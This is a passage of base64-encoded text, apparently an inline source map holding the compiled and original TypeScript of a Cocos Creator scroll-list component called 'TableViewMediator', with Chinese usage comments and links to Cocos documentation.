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lc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8qKlxyXG4gKiDkvb/nlKhUYWJsZVZpZXfms6jmhI/kuovpobk6XHJcbiAqIDEu6K6+572ubWFzayDorr7nva7plJrngrkoMCwgMSkgIOa3u+WKoHdpZGdldOW5tuiuvue9rnRvcCBib3R0b20gbGVmdCByaWdodOmDveS4ujBcclxuICogMi7orr7nva5jb250ZW50IOiuvue9rumUmueCuSgwLCAxKSAg5re75Yqgd2lkZ2V05bm26K6+572udG9wIGxlZnQgcmlnaHTpg73kuLowXHJcbiAqIDMu6K6+572uaXRlbU5vZGUgIOiuvue9ruWkp+Wwjyh3LGgp44CA6K6+572u6ZSa54K5KDAsIDAuNSlcclxuICogKiovXHJcblxyXG5pbXBvcnQgQWJzdHJhY3RUYWJsZUl0ZW0gZnJvbSBcIi4vQWJzdHJhY3RUYWJsZUl0ZW1cIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eSxtZW51LCByZXF1aXJlQ29tcG9uZW50LCBkaXNhbGxvd011bHRpcGxlLCBleGVjdXRpb25PcmRlcn0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuQG1lbnUoXCLoh6rlrprkuYkvVGFibGVWaWV3TWVkaWF0b3JcIilcclxuQHJlcXVpcmVDb21wb25lbnQoY2MuU2Nyb2xsVmlldylcclxuQGRpc2FsbG93TXVsdGlwbGVcclxuQGV4ZWN1dGlvbk9yZGVyKC0xMClcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgVGFibGVWaWV3TWVkaWF0b3IgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIHNjcm9sbFZpZXc6Y2MuU2Nyb2xsVmlldyA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KEFic3RyYWN0VGFibGVJdGVtKVxyXG4gICAgdGVtcGxhdGU6QWJzdHJhY3RUYWJsZUl0ZW0gPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5JbnRlZ2VyfSlcclxuICAgIG1hcmdpblRvcCA9IDA7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLkludGVnZXJ9KVxyXG4gICAgbWFyZ2luQm90dG9tID0gMDtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuSW50ZWdlcn0pXHJcbiAgICBtYXJnaW4gPSAwO1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgdGVzdE51bSA9IDA7XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBpdGVtQWN0aW9uOmJvb2xlYW4gPSBmYWxzZTtcclxuXHJcblxyXG4gICAgcHJpdmF0ZSBpdGVtSGVpZ2h0ID0gMDtcclxuXHJcbiAgICBsaXN0OkFycmF5PGNjLk5vZGU+ID0gW107XHJcblxyXG4gICAgcHJpdmF0ZSBmaXJzdEluZGV4ID0gMDtcclxuXHJcbiAgICBwcml2YXRlIGZpcnN0SW5kZXhNYXggPSAwO1xyXG5cclxuICAgIHByaXZhdGUgX2RhdGFzID0gW107XHJcbiAgICAvLyBMSUZFLUNZQ0xFIENBTExCQUNLUzpcclxuXHJcbiAgICBwcml2YXRlIGNyZWF0ZU5vZGVzRmluaXNoID0gZmFsc2U7XHJcblxyXG4gICAgcHJpdmF0ZSBjcmVhdGVOb2Rlc0xpc3RlbmVyKGxpc3RlbmVyOigpPT52b2lkKXtcclxuICAgICAgICBpZiAodGhpcy5jcmVhdGVOb2Rlc0ZpbmlzaCl7XHJcbiAgICAgICAgICAgIGxpc3RlbmVyKCk7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUub24oXCJDcmVhdGVOb2Rlc1N1Y2Nlc3NcIiwgKCk9PntcclxuICAgICAgICAgICAgICAgIGxpc3RlbmVyKCk7XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBnZXQgZGF0YXMoKTogYW55W10ge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9kYXRhcztcclxuICAgIH1cclxuXHJcbiAgICBzZXQgZGF0YXModmFsdWU6IGFueVtdKSB7XHJcbiAgICAgICAgLyoqIOiuoeeul+acgOWkp2ZpcnN0SW5kZXhNYXggKi9cclxuICAgICAgICB0aGlzLmNyZWF0ZU5vZGVzTGlzdGVuZXIoKCk9PntcclxuICAgICAgICAgICAgbGV0IG51bSA9IE1hdGguY2VpbCgodGhpcy5zY3JvbGxWaWV3Lm5vZGUuZ2V0Q29udGVudFNpemUoKS5oZWlnaHQgLSB0aGlzLm1hcmdpblRvcCAtIHRoaXMubWFyZ2luQm90dG9tICsgdGhpcy5tYXJnaW4pIC8gKHRoaXMuaXRlbUhlaWdodCt0aGlzLm1hcmdpbikpO1xyXG4gICAgICAgICAgICB0aGlzLmZpcnN0SW5kZXhNYXggPSB2YWx1ZS5sZW5ndGggLSBudW0gLSAxO1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyh0aGlzLmZpcnN0SW5kZXhNYXgsZGF0YXMubGVuZ3RoLCB0aGlzLmxpc3QubGVuZ3RoLCBudW0sIFwid3hTdWIgdGhpcy5maXJzdEluZGV4TWF4KioqKioqKioqKioqXCIpO1xyXG5cclxuICAgICAgICAgICAgdGhpcy5fZGF0YXMgPSB2YWx1ZS5zbGljZSgwKTtcclxuICAgICAgICAgICAgLy8gdGhpcy5kYXRhcyA9IFsxLDIsMyw0LDUsNiw3LDgsOV07XHJcbiAgICAgICAgICAgIHRoaXMuc2Nyb2xsVmlldy5jb250ZW50LmhlaWdodCA9IHRoaXMubWFyZ2luVG9wICsgdGhpcy5tYXJnaW5Cb3R0b20gKyB0aGlzLml0ZW1IZWlnaHQgKiB0aGlzLl9kYXRhcy5sZW5ndGggKyB0aGlzLm1hcmdpbiAqICh0aGlzLl9kYXRhcy5sZW5ndGggLSAxKTtcclxuICAgICAgICAgICAgdGhpcy5maXJzdEluZGV4ID0gMDtcclxuICAgICAgICAgICAgdGhpcy5zY3JvbGxWaWV3LnNjcm9sbFRvVG9wKCk7XHJcbiAgICAgICAgICAgIHRoaXMubGlzdC5mb3JFYWNoKCh2YWx1ZTEsIGluZGV4KSA9PiB7XHJcbiAgICAgICAgICAgICAgICB2YWx1ZTEueSA9IC10aGlzLm1hcmdpblRvcCAtIHZhbHVlMS5oZWlnaHQvMiAtIGluZGV4ICogKHZhbHVlMS5oZWlnaHQgKyB0aGlzLm1hcmdpbik7XHJcbiAgICAgICAgICAgICAgICBpZiAoaW5kZXggPj0gdGhpcy5fZGF0YXMubGVuZ3RoKXtcclxuICAgICAgICAgICAgICAgICAgICB2YWx1ZTEuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICB0aGlzLnVwZGF0ZURhdGEoKTtcclxuICAgICAgICAgICAgaWYgKHRoaXMuaXRlbUFjdGlvbil7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnNob3dBY3Rpb24oKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgY3JlYXRlTm9kZSgpe1xyXG4gICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUodGhpcy50ZW1wbGF0ZS5ub2RlKTtcclxuICAgICAgICBub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuaXRlbUhlaWdodCA9IG5vZGUuZ2V0Q29udGVudFNpemUoKS5oZWlnaHQ7XHJcbiAgICAgICAgbm9kZS54ID0gMDtcclxuICAgICAgICBub2RlLnNldFBhcmVudCh0aGlzLnNjcm9sbFZpZXcuY29udGVudCk7XHJcbiAgICAgICAgdGhpcy5saXN0LnB1c2gobm9kZSk7XHJcbiAgICAgICAgcmV0dXJuIG5vZGU7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBhZGROb2RlKGhlaWdodDpudW1iZXIpe1xyXG4gICAgICAgIGlmIChoZWlnaHQgPD0gdGhpcy5zY3JvbGxWaWV3Lm5vZGUuZ2V0Q29udGVudFNpemUoKS5oZWlnaHQpe1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgIGxldCBub2RlID0gdGhpcy5jcmVhdGVOb2RlKCk7XHJcbiAgICAgICAgICAgICAgICBub2RlLnkgPSAtaGVpZ2h0IC0gdGhpcy5pdGVtSGVpZ2h0LzI7XHJcbiAgICAgICAgICAgICAgICBoZWlnaHQgKz0gdGhpcy5pdGVtSGVpZ2h0ICsgdGhpcy5tYXJnaW47XHJcbiAgICAgICAgICAgICAgICB0aGlzLmFkZE5vZGUoaGVpZ2h0KTtcclxuICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIGxldCBub2RlID0gdGhpcy5jcmVhdGVOb2RlKCk7XHJcbiAgICAgICAgICAgIG5vZGUueSA9IC1oZWlnaHQgLSB0aGlzLml0ZW1IZWlnaHQvMjtcclxuICAgICAgICAgICAgbGV0IGV2ZW50SGFuZGxlciA9IG5ldyBjYy5Db21wb25lbnQuRXZlbnRIYW5kbGVyKCk7XHJcbiAgICAgICAgICAgIGV2ZW50SGFuZGxlci50YXJnZXQgPSB0aGlzLm5vZGU7IC8v6L+Z5LiqIG5vZGUg6IqC54K55piv5L2g55qE5LqL5Lu25aSE55CG5Luj56CB57uE5Lu25omA5bGe55qE6IqC54K5XHJcbiAgICAgICAgICAgIGV2ZW50SGFuZGxlci5jb21wb25lbnQgPSBcIlRhYmxlVmlld01lZGlhdG9yXCI7XHJcbiAgICAgICAgICAgIGV2ZW50SGFuZGxlci5oYW5kbGVyID0gXCJvblNjcm9sbEV2ZW50XCI7XHJcbiAgICAgICAgICAgIGV2ZW50SGFuZGxlci5jdXN0b21FdmVudERhdGEgPSBcIlwiO1xyXG4gICAgICAgICAgICB0aGlzLnNjcm9sbFZpZXcuc2Nyb2xsRXZlbnRzLnB1c2goZXZlbnRIYW5kbGVyKTtcclxuICAgICAgICAgICAgaWYgKCF0aGlzLmNyZWF0ZU5vZGVzRmluaXNoKXtcclxuICAgICAgICAgICAgICAgIHRoaXMuY3JlYXRlTm9kZXNGaW5pc2ggPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ub2RlLmVtaXQoXCJDcmVhdGVOb2Rlc1N1Y2Nlc3NcIik7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25Mb2FkKCl7XHJcbiAgICAgICAgdGhpcy5zY3JvbGxWaWV3ID0gdGhpcy5ub2RlLmdldENvbXBvbmVudChjYy5TY3JvbGxWaWV3KTtcclxuICAgICAgICAvLyBsZXQgZXZlbnRIYW5kbGVyID0gbmV3IGNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIoKTtcclxuICAgICAgICAvLyBldmVudEhhbmRsZXIudGFyZ2V0ID0gdGhpcy5ub2RlOyAvL+i/meS4qiBub2RlIOiKgueCueaYr+S9oOeahOS6i+S7tuWkhOeQhuS7o+eggee7hOS7tuaJgOWxnueahOiKgueCuVxyXG4gICAgICAgIC8vIGV2ZW50SGFuZGxlci5jb21wb25lbnQgPSBcIlRhYmxlVmlld01lZGlhdG9yXCI7XHJcbiAgICAgICAgLy8gZXZlbnRIYW5kbGVyLmhhbmRsZXIgPSBcIm9uU2Nyb2xsRXZlbnRcIjtcclxuICAgICAgICAvLyBldmVudEhhbmRsZXIuY3VzdG9tRXZlbnREYXRhID0gXCJcIjtcclxuICAgICAgICAvLyB0aGlzLnNjcm9sbFZpZXcuc2Nyb2xsRXZlbnRzLnB1c2goZXZlbnRIYW5kbGVyKTtcclxuICAgICAgICAvLyBsZXQgaXRlbU5vZGUgPSBjYy5pbnN0YW50aWF0ZSh0aGlzLnRlbXBsYXRlLm5vZGUpO1xyXG4gICAgICAgIC8vIGl0ZW1Ob2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIC8vIHRoaXMuaXRlbUhlaWdodCA9IGl0ZW1Ob2RlLmdldENvbnRlbnRTaXplKCkuaGVpZ2h0O1xyXG4gICAgICAgIC8vIGxldCBpdGVtSGVpZ2h0SGFsZiA9IHRoaXMuaXRlbUhlaWdodC8yO1xyXG4gICAgICAgIC8vIC8qKiDorqHnrpflh7p2aWV36IO96KOF5LiL5aSa5bCR5LiqaXRlbSAqL1xyXG4gICAgICAgIC8vIGxldCB2aWV3U2l6ZSA9IHRoaXMuc2Nyb2xsVmlldy5ub2RlLmdldENvbnRlbnRTaXplKCk7XHJcbiAgICAgICAgLy8gbGV0IGNvbnRlbnQgPSB0aGlzLnNjcm9sbFZpZXcuY29udGVudDtcclxuICAgICAgICAvL1xyXG4gICAgICAgIC8vIGxldCBoZWlnaHQgPSB0aGlzLm1hcmdpblRvcDtcclxuICAgICAgICAvLyB3aGlsZSAodHJ1ZSl7XHJcbiAgICAgICAgLy8gICAgIGlmIChoZWlnaHQgPiB2aWV3U2l6ZS5oZWlnaHQpe1xyXG4gICAgICAgIC8vICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgLy8gICAgIH1cclxuICAgICAgICAvL1xyXG4gICAgICAgIC8vICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKGl0ZW1Ob2RlKTtcclxuICAgICAgICAvLyAgICAgbm9kZS54ID0gMDtcclxuICAgICAgICAvLyAgICAgbm9kZS55ID0gLWhlaWdodCAtIGl0ZW1IZWlnaHRIYWxmO1xyXG4gICAgICAgIC8vICAgICBub2RlLnNldFBhcmVudChjb250ZW50KTtcclxuICAgICAgICAvLyAgICAgdGhpcy5saXN0LnB1c2gobm9kZSk7XHJcbiAgICAgICAgLy8gICAgIGhlaWdodCArPSB0aGlzLml0ZW1IZWlnaHQgKyB0aGlzLm1hcmdpbjtcclxuICAgICAgICAvLyAgICAgLy8gY29uc29sZS5sb2coXCJ3eCBzdWI9PT0+bm9kZS55XCIsIG5vZGUueSk7XHJcbiAgICAgICAgLy8gfVxyXG4gICAgICAgIC8vXHJcbiAgICAgICAgLy8gaXRlbU5vZGUueCA9IDA7XHJcbiAgICAgICAgLy8gaXRlbU5vZGUueSA9IC1oZWlnaHQgLSBpdGVtSGVpZ2h0SGFsZjtcclxuICAgICAgICAvLyBpdGVtTm9kZS5zZXRQYXJlbnQoY29udGVudCk7XHJcbiAgICAgICAgLy8gdGhpcy5saXN0LnB1c2goaXRlbU5vZGUpO1xyXG4gICAgICAgIHRoaXMuYWRkTm9kZSh0aGlzLm1hcmdpblRvcCk7XHJcblxyXG4gICAgICAgIC8qKiDlu7bov5/liKTmlq0gKi9cclxuICAgICAgICAvLyBsZXQgc2VsZiA9IHRoaXM7XHJcbiAgICAgICAgLy8gdGhpcy5zY2hlZHVsZU9uY2UoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgIC8vICAgICBzZWxmLl9hZGp1c3RMaXN0KCk7XHJcbiAgICAgICAgLy8gfSwgMC4xKTtcclxuICAgICAgICBpZiAodGhpcy50ZXN0TnVtID4gMCl7XHJcbiAgICAgICAgICAgIGxldCB0ZXN0ID0gW107XHJcbiAgICAgICAgICAgIGZvciAobGV0IGk9MDsgaTx0aGlzLnRlc3ROdW07IGkrKyl7XHJcbiAgICAgICAgICAgICAgICB0ZXN0LnB1c2goaSsxKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB0aGlzLmRhdGFzID0gdGVzdDtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgX2FkanVzdExpc3QoKXtcclxuICAgICAgICBsZXQgdmlld1NpemUgPSB0aGlzLnNjcm9sbFZpZXcubm9kZS5nZXRDb250ZW50U2l6ZSgpO1xyXG4gICAgICAgIGxldCBjb250ZW50ID0gdGhpcy5zY3JvbGxWaWV3LmNvbnRlbnQ7XHJcbiAgICAgICAgbGV0IGl0ZW1IZWlnaHRIYWxmID0gdGhpcy5pdGVtSGVpZ2h0LzI7XHJcbiAgICAgICAgbGV0IGhlaWdodCA9IHRoaXMubWFyZ2luVG9wICsgKHRoaXMuaXRlbUhlaWdodCArIHRoaXMubWFyZ2luKSAqIHRoaXMubGlzdC5sZW5ndGggIC0gdGhpcy5tYXJnaW47XHJcbiAgICAgICAgd2hpbGUgKGhlaWdodCA8IHZpZXdTaXplLmhlaWdodCArIHRoaXMuaXRlbUhlaWdodCl7XHJcbiAgICAgICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUodGhpcy50ZW1wbGF0ZS5ub2RlKTtcclxuICAgICAgICAgICAgbm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgbm9kZS54ID0gMDtcclxuICAgICAgICAgICAgbm9kZS55ID0gLWhlaWdodCAtIGl0ZW1IZWlnaHRIYWxmO1xyXG4gICAgICAgICAgICBub2RlLnNldFBhcmVudChjb250ZW50KTtcclxuICAgICAgICAgICAgdGhpcy5saXN0LnB1c2gobm9kZSk7XHJcbiAgICAgICAgICAgIGhlaWdodCArPSB0aGlzLml0ZW1IZWlnaHQgKyB0aGlzLm1hcmdpbjtcclxuICAgICAgICAgICAgaWYgKHRoaXMuX2RhdGFzLmxlbmd0aCA+PSB0aGlzLmxpc3QubGVuZ3RoKXtcclxuICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IHRoaXMubGlzdC5sZW5ndGgtMTtcclxuICAgICAgICAgICAgICAgIGxldCB2YWx1ZSA9dGhpcy5saXN0W2luZGV4XTtcclxuICAgICAgICAgICAgICAgIHZhbHVlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUl0ZW0odmFsdWUsIGluZGV4KTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgICBpZiAodGhpcy5fZGF0YXMubGVuZ3RoID4gMCl7XHJcbiAgICAgICAgICAgIGxldCBudW0gPSBNYXRoLmNlaWwoKHZpZXdTaXplLmhlaWdodCAtIHRoaXMubWFyZ2luVG9wIC0gdGhpcy5tYXJnaW5Cb3R0b20gKyB0aGlzLm1hcmdpbikgLyAodGhpcy5pdGVtSGVpZ2h0K3RoaXMubWFyZ2luKSk7XHJcbiAgICAgICAgICAgIHRoaXMuZmlyc3RJbmRleE1heCA9IHRoaXMuX2RhdGFzLmxl